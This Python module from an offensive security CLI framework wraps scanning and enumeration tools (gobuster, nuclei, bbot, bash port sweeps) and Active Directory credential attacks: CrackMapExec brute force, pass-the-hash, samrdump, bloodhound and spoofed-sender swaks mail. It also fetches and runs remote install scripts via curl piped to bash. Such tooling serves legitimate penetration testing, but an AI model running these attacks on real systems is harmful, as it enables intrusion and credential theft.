"""Scanning command set.

Phase-scoped home for the scanning operator commands (category
``02. Scanning & Enumeration``, kill-chain phase ``scan``). This module is an
empty, active ``CommandSet`` scaffold: migrate one ``do_*`` method at a time
out of ``lazyown.py`` into this class.

This set is a sibling of :class:`cli.commands.enum.EnumCommandSet`; both share
the ``02. Scanning & Enumeration`` cmd2 category but differ by kill-chain
phase (``scan`` vs ``enum``). Put broad host/service discovery and network
scanners here; put targeted service enumeration in ``enum.py``.

Migration rule
--------------
When you paste a ``do_<name>`` method here you MUST delete the original copy
from ``lazyown.py`` in the same change. Registering the same command name on
both the shell and an active ``CommandSet`` raises a duplicate-command error
at startup. Decorate migrated methods with
``@cmd2.with_category(scanning_category)`` so they keep their help grouping,
and rely on :class:`cli.commands._base.LazyOwnCommandSet` to forward
``self.params`` / ``self.cmd`` / other shell state once registered.

Discovery is automatic: :func:`cli.registry.register_command_sets` finds this
class at startup, so no wiring change is needed as commands are added.
"""

from __future__ import annotations

import json
import os
import subprocess

import cmd2

import utils as _lazy_utils
from cli.commands._base import LazyOwnCommandSet
from utils import (
    CYAN,
    GREEN,
    MAGENTA,
    RESET,
    WHITE,
    NmapParser,
    NmapProcess,
    check_lport,
    check_rhost,
    copy2clip,
    get_credentials,
    get_domain,
    get_hash,
    get_users_dic,
    is_binary_present,
    print_error,
    print_msg,
    print_warn,
    scanning_category,
)


class ScanCommandSet(LazyOwnCommandSet):
    """Scanning phase commands (migrate ``do_*`` here one at a time)."""

    phase = "scan"
    category = scanning_category

    @cmd2.with_category(scanning_category)
    def do_gobuster(self, line):
        """
        Uses `gobuster` for directory and virtual host fuzzing based on provided parameters. Supports directory enumeration and virtual host discovery.

        :param line: The options and arguments for `gobuster`. The `line` parameter can include the following:
            - `url`: Perform directory fuzzing on a specified URL. Requires `url` and `dirwordlist` to be assign.
            - `vhost`: Perform virtual host discovery on a specified URL. Requires `url` and `dirwordlist` to be assign.
            - Any other argument: General directory fuzzing with additional parameters.

        :returns: None

        Manual execution:
        To manually use `gobuster`, use the following commands:

        1. For directory fuzzing:
            gobuster dir --url <url>/ --wordlist <wordlist>

        Example:
            gobuster dir --url http://example.com/ --wordlist /path/to/dirwordlist

        2. For virtual host discovery:
            gobuster vhost --append-domain -u <url> -w <wordlist> --random-agent -t 600

        Example:
            gobuster vhost --append-domain -u http://example.com -w /path/to/dirwordlist --random-agent -t 600

        3. For general directory fuzzing with additional parameters:
            gobuster dir --url http://<rhost>/ --wordlist <wordlist> <additional_parameters>

        Example:
            gobuster dir --url http://10.10.10.10/ --wordlist /path/to/dirwordlist -x .php,.html
        """
        if not is_binary_present("gobuster"):
            print_warn("Gobuster not found on your system... instaling...")
            command = "go install github.com/OJ/gobuster/v3@latest"
            print_msg(f"Try... {command}")
            self.cmd(command)
            print_warn("Add ~/go/bin to your path in your .bashrc or .zshrc file")

        dirwordlist = self.params["dirwordlist"]
        choice = (
            self.ask(
                "    [!] Enter the numer 1 to directory-list-2.3-medium.txt 2 to raft-large-words.txt [1/2] (Default 2): "
            , "2")
        )
        if choice == "2":
            dirwordlist = dirwordlist.replace("directory-list-2.3-medium.txt", "raft-large-words.txt")
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print_error(f"rhost and dirwordlist must be assign {RESET}")
            return
        if line == "url":
            url = self.params["url"]
            if not url:
                print_error(f"url must be assign, ex: assign url http://domain.ext {RESET}")
                return
            print_msg(f"Try gobuster dir --url {url}/ --wordlist {dirwordlist} --add-slash{RESET}")
            self.cmd(f"gobuster dir --url {url}/ --wordlist {dirwordlist} --add-slash")
            return
        if line.startswith("vhost"):
            url = self.params["url"]
            if not url:
                print_error(f"url must be assign, ex: assign url http://domain.ext {RESET}")
                return
            print_msg(f"Try gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600{RESET}")
            self.cmd(f"gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600")
            return
        print_msg(f"Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} --add-slash{RESET}")
        self.cmd(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} --add-slash")
        return






    @cmd2.with_category(scanning_category)
    def do_auto_nuclei(self, line):
        """
        Context-ranked deterministic Nuclei sweep for the bound target.

        Reads the world model and nmap XML, ranks the installed templates by
        the observed services and CVEs, and runs the bounded winner set with
        ``nuclei -jsonl``. Findings are published through the outcome bus so
        the world model, findings ledger and reports stay consistent. The
        run is capped by template count, rate limit and a hard wall-clock
        deadline; no prompts and no template updates.

        Usage:
            auto_nuclei [target]

        :param line: Optional explicit target; falls back to ``rhost``.
        :returns: None
        """
        from modules.auto_nuclei import AutoNucleiEngine

        target = line.strip() if line else self.params["rhost"]
        if not check_rhost(target):
            return
        if not is_binary_present("nuclei"):
            print_warn(
                "nuclei not found in PATH. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
            )
            return
        print_msg(f"[*] auto_nuclei: ranking templates for {target}...")
        result = AutoNucleiEngine().run(target)
        if result.error:
            print_error(f"auto_nuclei failed: {result.error}")
            return
        print_msg(f"[*] templates selected: {len(result.templates)} (context-ranked)")
        for item in result.templates[:10]:
            print_msg(f"  [{item.template.severity}] {item.template.id} (score {item.score})")
        print_msg(f"[*] findings: {result.finding_count if hasattr(result, 'finding_count') else len(result.findings)}")
        for finding in result.findings[:10]:
            print_msg(f"  [{finding.get('severity', 'info')}] {finding.get('template-id', finding.get('id', '?'))} {finding.get('matched-at', '')}")
        if result.artifact:
            print_msg(f"[*] artifact: {result.artifact}")

    @cmd2.with_category(scanning_category)
    def do_nuclei(self, line):
        """
        Executes a Nuclei scan on a specified target URL or host.

        Usage:
            nuclei -u <URL> [-o <output file>] [other options]

        If a URL is provided as an argument, it will be used as the target for the scan.
        Otherwise, it will use the target specified in self.params["rhost"].
        """
        if not is_binary_present("nuclei"):
            print_warn("Installing nuclei...")
            self.cmd("go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest ")
        self.cmd("sudo nuclei -update-templates")
        if line:
            if line.startswith("url"):
                rhost = self.params["url"]
            else:
                rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
        domain = get_domain(rhost)
        output_file = f"sessions/{domain}_nuclei_output.txt"
        choice = self.ask("    [?] do you want use extra templates path: (y/n) ", "y")
        if choice == "y":
            install = self.ask("    [?] do you want clone extra templates repo: (y/n) ", "y")
            if install == "y":
                self.cmd("cd .. && git clone https://github.com/projectdiscovery/nuclei-templates.git 2>/dev/null")
            path = self.ask("    [!] Enter the path to templates (default ../nuclei-templates): ", "../nuclei-templates")
            cmd = ["nuclei", "-t", path, "-u", rhost, "-o", output_file, "-tags", "cve"]
        else:
            cmd = ["nuclei", "-u", rhost, "-o", output_file, "-tags", "cve"]
        try:
            print_msg(cmd)
            subprocess.run(cmd, check=True)
            self.cmd(f"cat {output_file}")
        except subprocess.CalledProcessError as e:
            print_error(f"Error running Nuclei scan: {e}")


    @cmd2.with_category(scanning_category)
    def do_bbot(self, line):
        """
        Executes a BBOT scan to perform various reconnaissance tasks.

        This function leverages BBOT, a reconnaissance tool, to perform tasks such as subdomain enumeration,
        email gathering, web scanning, and more. It dynamically determines the operation based on user input
        and executes the appropriate BBOT commands.

        Parameters:
            line (str): User input specifying the target and optional presets or configurations.

        Usage:
            bbot -t <target> -p <preset>

            Examples:
                bbot -t evilcorp.com -p subdomain-enum
                bbot -t evilcorp.com -p email-enum spider web-basic
        """
        try:
            bbot_check = self.cmd("which bbot > /dev/null 2>&1")
            if bbot_check != 0:
                print_warn("BBOT is not installed. Installing...")
                self.cmd("pipx install bbot")
                print_msg("BBOT installed successfully.")

            domain = self.params.get("domain", "localhost")

            choice = (
                self.ask("    [!] Enter the mode (1 Subdomain, 2 Spider, 3 Email, 4 Web, 5 Web thorough, 6 All): ", "6")
            )

            if choice == "1":
                command = f"bbot -t {domain} -p subdomain-enum "
            elif choice == "2":
                command = f"bbot -t {domain} -p spider "
            elif choice == "3":
                command = f"bbot -t {domain} -p email-enum "
            elif choice == "4":
                command = f"bbot -t {domain} -p web-basic "
            elif choice == "5":
                command = f"bbot -t {domain} -p web-thorough "
            elif choice == "6":
                command = f"bbot -t {domain} -p subdomain-enum cloud-enum code-enum email-enum spider web-basic paramminer dirbust-light web-screenshots --allow-deadly"
            print_msg(f"Ejecutando comando BBOT: {command}")
            self.cmd(command)
            self.logcsv(f"bbot {command}")
            print_msg("Escaneo con BBOT completado.")
        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(scanning_category)
    def do_osmedeus(self, line):
        """
        Executes Osmedeus scans with guided input for various scanning scenarios.

        This function performs the following actions:
        1. Verifies the presence of Osmedeus; if not installed, it clones the repository
        and installs the required dependencies.
        2. Guides the user through selecting the type of scan, target, and any additional
        parameters needed for the scan.
        3. Constructs and executes the appropriate Osmedeus command.

        Parameters:
        line (str): Command-line arguments for the tool. If not provided, interactive
                    input will be used.

        Returns:
        None
        """
        path = os.getcwd()
        osmedeus_path = os.path.join("external", ".exploit", "osmedeus")
        osmedeus_path = f"{path}/{osmedeus_path}"
        osmedeus_repo = "https://github.com/j3ssie/osmedeus.git"
        go_install_cmd = (
            'bash -c "bash <(curl -fsSL https://raw.githubusercontent.com/osmedeus/osmedeus-base/master/install.sh)"'
        )

        if not os.path.isdir(osmedeus_path):
            print_warn("Osmedeus is not installed. Cloning the repository and installing dependencies.")
            self.cmd(f"git clone {osmedeus_repo} {osmedeus_path}")
            if not os.path.isdir(osmedeus_path):
                print_error(f"Osmedeus clone failed: {osmedeus_path} missing")
                return
            os.chdir(osmedeus_path)
            self.cmd(go_install_cmd)
            print_msg("Osmedeus installation completed.")
            os.chdir(path)

        scan_types = {
            "1": "general (default reconnaissance workflow)",
            "2": "extensive (in-depth analysis)",
            "3": "vuln (vulnerability scan)",
            "4": "fast (quick summary scan)",
            "5": "subdomain-enum (subdomain enumeration only)",
            "6": "extensive-vuln (extensive vulnerability scan)",
            "7": "repo-scan (static vulnerability and secret scan on repositories)",
            "8": "cidr (scan for CIDR ranges)",
        }

        print_msg("Select the type of scan to perform:")
        for key, description in scan_types.items():
            print_msg(f"  {key}. {description}")

        scan_choice = self.ask("    [!] Enter the number corresponding to your choice (default: 1): ", "1")
        flow = scan_types.get(scan_choice, "general").split()[0]
        domain = self.params["domain"]
        url = self.params["url"]
        target = self.ask(f"    [!] Enter the target (e.g., {domain}, list_of_targets.txt): ", domain)
        if not target:
            print_warn("A target is required to execute the scan.")
            return

        additional_params = ""
        if flow in ["cidr", "repo-scan"]:
            if flow == "cidr":
                additional_params = self.ask(
                    "    [!] Enter CIDR format (e.g., 1.2.3.4/24) or leave empty for file input: "
                )
            elif flow == "repo-scan":
                additional_params = self.ask(f"    [!] Enter the repository URL {url} or folder path: ", url)

        osmedeus_command = f"osmedeus scan -f {flow} -t {target} {additional_params}".strip()
        print_msg(f"Executing Osmedeus with command: {osmedeus_command}")
        self.cmd(osmedeus_command)
        self.logcsv(f"osmedeus {osmedeus_command}")
        os.chdir(path)
        return

    @cmd2.with_category(scanning_category)
    def do_magicrecon(self, line):
        """
        Command magicrecon: Automates the setup and usage of MagicRecon to perform various types of reconnaissance and vulnerability scanning on specified targets.

        This function performs the following tasks:
        1. Clones and installs MagicRecon if not already installed.
        2. Prompts the user to input the target domain, list, or wildcard if not provided.
        3. Executes MagicRecon with the specified options for target reconnaissance and vulnerability analysis.
        4. Supports notifications through Discord, Telegram, or Slack if configured.

        Args:
            line (str): Command-line arguments specifying the target and recon mode. If not provided, the function prompts the user for required inputs.

        Returns:
            None

        Example:
            magicrecon -d example.com -a
        """

        magicrecon_repo = "https://github.com/robotshell/magicRecon.git"
        magicrecon_dir = os.path.join(os.getcwd(), "external/.exploit/magicRecon")

        url = self.params["url"]
        url = get_domain(url)

        if not os.path.exists(magicrecon_dir):
            print_msg("Cloning MagicRecon repository...")
            self.cmd(f"git clone {magicrecon_repo} {magicrecon_dir}")
            print_msg("Installing MagicRecon...")
            self.cmd(f"chmod +x {magicrecon_dir}/install.sh && {magicrecon_dir}/install.sh")
        else:
            print_msg("MagicRecon already installed, skipping setup.")

        args = line.split()

        if not args:
            print_msg("No arguments provided. Please specify target options.")
            target = self.ask(f"Enter target domain default {url}: ", url)
            mode = self.ask("Enter mode option (-a, -p, -x, -r, -v, -m): ", "-a")
            notification = (
                self.ask("Enable notifications via Discord, Telegram, or Slack? (yes/no): ").lower() or "no"
            )

            if notification == "yes":
                notify = "-n"
            else:
                notify = ""

            cmd = f"cd sessions && {magicrecon_dir}/magicrecon.sh -d {target} {mode} {notify}"
        else:
            cmd = f"cd sessions && {magicrecon_dir}/magicrecon.sh {' '.join(args)}"

        print_msg(f"Running MagicRecon command: {cmd}")
        self.cmd(cmd)
        return

    @cmd2.with_category(scanning_category)
    def do_hostdiscover(self, line):
        """
        Discover active hosts in a subnet by performing a ping sweep.

        This method constructs and executes a bash script that performs a
        ping sweep on the specified subnet to identify active hosts. The
        subnet is determined from the 'rhost' parameter. For each host in
        the subnet, a ping request is sent, and active hosts are reported.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the first three octets of the 'rhost' parameter to form
        the base IP pattern.
        - Constructs a bash script to ping each IP address in the subnet
        (from .1 to .254) and reports active hosts.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the
        generated command.
        - If the user confirms, executes the command using `self.cmd()`.
        - If the user declines, copies the command to the clipboard using
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the
        user.
        - `copy2clip()` is used to copy the command to the clipboard if
        not executed.

        Example:
        >>> do_hostdiscover("example_input")
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        oct_rhost = rhost.split(".")
        pattern = oct_rhost[0] + "." + oct_rhost[1] + "." + oct_rhost[2]
        command = """        #!/bin/bash
        for i in $(seq 1 254); do
                timeout 1 bash -c "ping -c 1 {pattern}.$i" &>/dev/null && echo "[+] Host {pattern}.$i - active" &
        done; wait
        """.replace("        ", "").replace("{pattern}", pattern)
        print_msg(command)
        execute = self.ask("Do you want to execute? (yes/no): ").lower()
        if execute == "yes":
            self.cmd(command)
        else:
            copy2clip(command)
        return

    @cmd2.with_category(scanning_category)
    def do_portdiscover(self, line):
        """
        Scan all ports on a specified host to identify open ports.

        This method constructs and executes a bash script that performs a
        port scan on the specified host to determine which ports are open.
        It scans all ports from 0 to 65535 and reports any that are open.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the 'rhost' parameter to determine the target IP address.
        - Constructs a bash script to scan all ports on the target IP address
        and report open ports.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the
        generated command.
        - If the user confirms, executes the command using `self.cmd()`.
        - If the user declines, copies the command to the clipboard using
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the
        user.
        - `copy2clip()` is used to copy the command to the clipboard if
        not executed.

        Example:
        >>> do_portdiscover("example_input")
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        command = """        #!/bin/bash
        ip="{rhost}"
        echo "Open port scan in progress..."
        echo " "

        # Loop through all ports and check if they are open
        for port in $(seq 0 65535); do
            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && echo "Port $port open"
        done
        """.replace("        ", "").replace("{rhost}", rhost)
        print_msg(command)
        execute = self.ask("Do you want to execute? (yes/no): ").lower()
        if execute == "yes":
            self.cmd(command)
        else:
            copy2clip(command)
        return

    @cmd2.with_category(scanning_category)
    def do_portservicediscover(self, line):
        """
        Scan all ports on a specified host to identify open ports and associated services.

        This method constructs and executes a bash script that performs a
        port scan on the specified host to determine which ports are open
        and identifies any services running on those open ports. It scans
        all ports from 0 to 65535.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the 'rhost' parameter to determine the target IP address.
        - Constructs a bash script to scan all ports on the target IP address
        and report open ports along with any associated services.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the
        generated command.
        - If the user confirms, executes the command using `self.cmd()`.
        - If the user declines, copies the command to the clipboard using
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
        - Requires `sudo` privileges to use `lsof` for identifying services.
        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the
        user.
        - `copy2clip()` is used to copy the command to the clipboard if
        not executed.

        Example:
        >>> do_portservicediscover("example_input")
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        command = """        #!/bin/bash
        ip="{rhost}"
        echo "Open port and service scan in progress..."
        echo " "

        # Loop through all ports and check if they are open
        for port in $(seq 0 65535); do
            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && {
                service=$(echo "$(sudo lsof -i :$port)" | awk 'NR==2{print $1}')
                [ -n "$service" ] && echo "Port $port open - Service: $service"
            }
        done
        """.replace("        ", "").replace("{rhost}", rhost)
        print_msg(command)
        execute = self.ask("Do you want to execute? (yes/no): ").lower()
        if execute == "yes":
            self.cmd(command)
        else:
            copy2clip(command)
        return


    @cmd2.with_category(scanning_category)
    def do_vscan(self, line):
        """Perform port scanning using vscan with the provided parameters.

        :param line: This parameter is not used in the function but can be reserved for future use.

        :returns: None

        Manual execution:
        To manually run `vscan` for port scanning, use the following command:

            ./vscan -host <hosts> -p <ports>

        This function prompts the user for the target hosts and ports, and executes the vscan command accordingly.
        """
        if not is_binary_present("vscan"):
            print_warn("vscan is not installed. Installing dependencies and vscan tool.")
            self.cmd("sudo apt install -y libpcap-dev golang git")
            self.cmd("cd && git clone https://github.com/veo/vscan.git")
            self.cmd("cd vscan && go build")
            command = """
            bash -c '
            if [[ "$SHELL" == */bash ]]; then
                echo "    [!] Bash"
                echo "export PATH=$PATH:~/vscan" >> ~/.bashrc
            elif [[ "$SHELL" == */zsh ]]; then
                echo "    [!] Zsh"
                echo "export PATH=$PATH:~/vscan" >> ~/.zshrc
            fi
            '
            """.replace("            ", "")
            self.cmd(command)
        print_msg("Gathering parameters for vscan port scanning...")

        rhost = self.params["rhost"]
        hosts = self.ask("    [!] Enter the hosts to scan (comma-separated): ", rhost)
        if not hosts:
            print_error("    [!] Hosts cannot be empty!")
            return

        ports = (
            self.ask("    [!] Enter the ports to scan (comma-separated or range): ", "80,443,22,21,23,25,110,143,53,3306,8080,3389,135,139,445,993,995,1723,111,5900,1025,465,587,49152,49153,49154,49155,49156,49157,548,631,993,2049,444,5000,5060,5800,53,111,179,123,137,138,69,514,2049,520,162,4500")
        )

        output_file = self.ask("    [!] Enter the output file : ", hosts.replace(",", "_"))

        command = f"cd sessions && vscan -host {hosts} -p {ports} -v"

        if output_file:
            command += f" -json -o {output_file}.json"

        print_msg(f"Executing command: {command}")
        self.cmd(command)

        return


__all__ = ["ScanCommandSet"]
MSF_RC_SHRED_CAP_BYTES = 1_000_000


for _lazy_name in dir(_lazy_utils):
    if not _lazy_name.startswith("_"):
        globals().setdefault(_lazy_name, getattr(_lazy_utils, _lazy_name))


del _lazy_utils, _lazy_name


class ScanMigratedCommandSet(LazyOwnCommandSet):
    phase = "scan"
    category = "02. Scanning & Enumeration"

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_cme(self, line):
        """
        Execute CrackMapExec (CME) for SMB enumeration and authentication attempts against a target.

        This function provides a range of SMB operations using CME, including:
        1. RID brute-forcing, which attempts to enumerate users via RID cycling.
        2. Share enumeration to list SMB shares on the target.
        3. User authentication to verify credentials against the target.
        4. Brute-force authentication using username and password lists.
        5. Hash-based authentication to attempt access using an NTLM hash.

        Parameters:
        line (str): Specifies the action to perform, which can be one of the following:
                    - "rid": Enumerates users by attempting RID brute-force.
                    - "shares": Lists SMB shares on the target.
                    - "user": Verifies credentials from a stored credential file or prompts for a username and password.
                    - "brute": Attempts brute-force authentication using a user and password dictionary.
                    - "hash": Attempts authentication using an NTLM hash file.
                    If no valid option is provided, the function defaults to performing basic SMB enumeration.

        Returns:
        None

        Manual Execution Example:
        To manually run CrackMapExec for SMB enumeration, use:

            crackmapexec smb <target>

        Example:
            crackmapexec smb 10.10.11.24

        This command performs basic SMB enumeration and checks against the specified target IP address.
        """
        path = os.getcwd()
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        if check_rhost(self.params["rhost"]):
            if line:
                if line.startswith("rid"):
                    if not os.path.exists(f"{path}/sessions/credentials.txt"):
                        username = (
                            self.ask(
                                "    [!] Enter the username with self.params['domain'] (default 'Administrator'): "
                            , "administrator")
                        )
                        password = self.ask("    [!] Enter the password (default: admin): ", "admin")
                    else:
                        path_cred = get_credentials(True)
                        with open(path_cred) as file:
                            for file_line in file:
                                params = file_line.split(":")
                                username = params[0]
                                password = params[1].replace("\n", "")

                    print_msg(f"Try... crackmapexec smb {self.params['rhost']} -u {username} -p {password} --rid-brute")
                    self.cmd(f"crackmapexec smb {self.params['rhost']} -u {username} -p {password} --rid-brute")
                    print_warn(
                        f"Done... crackmapexec smb {self.params['rhost']} -u {username} -p {password} --rid-brute"
                    )
                    return
                elif line.startswith("shares"):
                    path_cred = get_credentials(True)

                    if not os.path.exists(path_cred):
                        username = self.ask(
                            "    [!] Enter the username with self.params['domain'] (e.g., 'user@self.params['domain'].com'): "
                        )
                        password = self.ask("    [!] Enter the password: ")
                    else:
                        with open(path_cred) as file:
                            for file_line in file:
                                params = file_line.split(":")
                                username = params[0]
                                password = params[1].replace("\n", "")
                    print_msg(f"Try... crackmapexec smb {self.params['rhost']} -u {username} -p {password} --shares")
                    self.cmd(f"crackmapexec smb {self.params['rhost']} -u {username} -p {password} --shares")
                    print_warn(
                        f"Done... crackmapexec smb {self.params['rhost']} -u {username} -p '{password}' --shares"
                    )
                    return
                elif line.startswith("user"):
                    path_cred = get_credentials(True)

                    if not os.path.exists(path_cred):
                        username = self.ask(
                            "    [!] Enter the username with self.params['domain'] (e.g., 'user@self.params['domain'].com'): "
                        )
                        password = self.ask("    [!] Enter the password: ")
                    else:
                        with open(path_cred) as file:
                            for file_line in file:
                                params = file_line.split(":")
                                username = params[0]
                                password = params[1].replace("\n", "")
                    print_msg(f"Try... crackmapexec smb {self.params['rhost']} -u {username} -p {password}")
                    self.cmd(f"crackmapexec smb {self.params['rhost']} -u {username} -p '{password}'")
                    print_warn(f"Done... crackmapexec smb {self.params['rhost']} -u {username} -p '{password}'")
                    return
                elif line.startswith("brute"):
                    print_msg("Enter the users diccionary:")
                    path_cred = get_users_dic()
                    print_msg("Enter the password diccionary:")
                    pass_cred = get_users_dic()
                    if not os.path.exists(path_cred):
                        print_error(f"Error with the file: {pass_cred}")
                        return
                    else:
                        print_msg("Brute-forcing SMB... this may take several minutes...")
                        command = f"crackmapexec smb {self.params['rhost']} -d {self.params['domain']} -u {path_cred} -p {pass_cred} --continue-on-success"
                        print_msg(f"Try... {command}")
                        self.cmd(command)
                        print_warn(f"Done... {command}")
                        return
                elif line.startswith("hash"):
                    rhost = self.params["rhost"]
                    domain = self.params["domain"]
                    selected_hash_path = get_hash(dir=True)

                    if selected_hash_path:
                        with open(selected_hash_path) as file:
                            hash_content = file.read().strip()
                        selected_hash = hash_content.split(":")[1]
                        username = os.path.basename(selected_hash_path).replace("hash_", "").replace(".txt", "")
                        if selected_hash:
                            command = f"cme smb {self.params['rhost']} -d {self.params['domain']} -u {username} -H {selected_hash}"
                            print_msg(f"Executing: {command}")
                            self.cmd(command)
                        else:
                            print_error("No hash content found. Exiting.")
                    else:
                        print_error("No hash file selected. Exiting.")
            else:
                print_msg(f"Try... crackmapexec smb {self.params['rhost']}")
                self.cmd(f"crackmapexec smb {self.params['rhost']}")
                print_msg(f"Done... crackmapexec smb {self.params['rhost']}")
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_ldapdomaindump(self, line):
        """
        Dumps LDAP information using `ldapdomaindump` with credentials from a file.

        :param line: The self.params['domain'] to use for authentication (e.g., 'self.params['domain'].local').

        :returns: None

        Manual execution:
        To manually run `ldapdomaindump` for LDAP enumeration, use the following command:

            ldapdomaindump -u '<self.params['domain']>\\<username>' -p '<password>' <target>

        Example:
            ldapdomaindump -u 'self.params['domain'].local\\Administrator' -p 'passadmin123' 10.10.11.23

        Ensure you have a file `sessions/credentials.txt` in the format `user:password`, where each line contains credentials for the LDAP enumeration.
        """

        rhost = self.params["rhost"]
        if not self.params["rhost"] or not line:
            print_error(
                "Add self.params['domain'] and self.params['rhost'] must be assign to more info see help assign (assign self.params['rhost'] 10.10.10.10) ex: addhost self.params['domain'].ext"
            )
            return
        path_cred = "sessions/credentials.txt"
        if not os.path.exists(path_cred):
            print_error("You must have file sessions/credentials.txt with this format: user:password")
            return

        with open(path_cred) as file:
            for file_line in file:
                params = file_line.split(":")
                user = params[0]
                passwd = params[1].replace("\n", "")
                print_msg(
                    f"    {GREEN}[*] Try... ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {self.params['rhost']}"
                )
                self.cmd(f"cd sessions && ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {self.params['rhost']}")
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_bloodhound(self, line):
        """Perform LDAP enumeration using bloodhound-python with credentials from a file.

        :param line: This parameter is not used in the function but could be used for additional options or self.params['domain'] information.

        :returns: None

        Manual execution:
        To manually run `bloodhound-python` for LDAP enumeration, use the following command:

            bloodhound-python -c All -u '<username>' -p '<password>' -ns <target>

        Example:
            bloodhound-python -c All -u 'usuario' -p 'password' -ns 10.10.10.10

        Ensure you have a file `sessions/credentials.txt` with the format `user:password`, where each line contains credentials for enumeration.
        """
        rhost = self.params["rhost"]
        self.params["url"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]

        if check_rhost(self.params["rhost"]):
            path_cred = "sessions/credentials.txt"
            if not os.path.exists(path_cred):
                print_error(
                    "You must have file sessions/credentials.txt with this format: user:password more help createcredentials"
                )
                return
            with open(path_cred) as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    dc = self.ask(f"    [!] enter DC subdomain example dc01: (Default: {subdomain})", subdomain)

                    if dc:
                        sub = f" -gc '{dc}.{self.params['domain']}' "
                    else:
                        sub = " "
                    print_msg(
                        f"    {GREEN}[*] Try... bloodhound-python -u '{user}' -p '{passwd}' -d '{self.params['domain']}' {sub} -ns {self.params['rhost']} -c all --zip"
                    )
                    command = f"cd sessions && bloodhound-python -u '{user}' -p '{passwd}' -d '{self.params['domain']}' {sub} -ns {self.params['rhost']} -c all --zip"
                    self.cmd(command)
                    self.logcsv(f"ldapsearch {command}")
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_swaks(self, line):
        """
        Sends an email using `swaks` (Swiss Army Knife for SMTP).

        This method constructs and executes a `swaks` command to send an email from an attacker’s address
        to a victim’s address, with a specified message body. The command is executed using the SMTP server
        address provided in the parameters.

        Parameters:
        - `line`: (str) Input line that is not used in this function.

        Functionality:
        1. Retrieves the SMTP server address (`self.params['rhost']`) from the object's parameters.
        2. Checks if the server address is valid using `check_rhost()`.
        3. Prompts the user for the sender's email address (`from_attacker`).
        4. Prompts the user for the recipient's email address (`to_victim`).
        5. Prompts the user for the message body (`body`).
        6. Constructs the `swaks` command with the provided options.
        7. Executes the command using `self.cmd()`.
        8. Copies the command to the clipboard using `copy2clip()`.

        Example usage:
        >>> do_swaks("line")

        swaks --from attacker@hell.com --to victim@heaven.com,victim2@heaven.com,victim3@heaven.com   --body "testing" --server 127.0.0.1
        """

        rhost = self.params["rhost"]
        if not check_rhost(self.params["rhost"]):
            return
        from_attacker = self.ask(f"    {CYAN}[?] {MAGENTA}FROM:  {RESET}")
        to_victim = self.ask(f"    {CYAN}[?] {MAGENTA}TO:  {RESET}")
        body = self.ask(f"    {CYAN}[?] {MAGENTA}BODY:  {RESET}")
        command = f"swaks --from {from_attacker} --to {to_victim} --body {body} --server {self.params['rhost']}"
        self.cmd(command)
        copy2clip(command)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_samrdump(self, line):
        """
        Run `impacket-samrdump` to dump SAM data from specified ports.

        This function executes `impacket-samrdump` to retrieve SAM data from the target host on ports 139 and 445. It first checks if the `self.params['rhost']` parameter is valid, and if so, it runs the command for both ports.

        Usage:
            samrdump <target_host>

        :param line: The target host to dump SAM data from.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, specify the target host. The function will attempt to dump SAM data from the host on ports 139 and 445.
        impacket-samrdump -port 445 10.10.10.10
        Note: Ensure that `impacket-samrdump` is installed and properly configured on your system.
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        hash_txt = f"{path}/sessions/hash.txt"

        if not check_rhost(self.params["rhost"]):
            return

        if line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
            command = f"impacket-samrdump -port 139 -target-ip {self.params['rhost']} {hashis} -dc-ip {self.params['rhost']} {self.params['domain']}"
            print_msg(command)
            self.cmd(command)
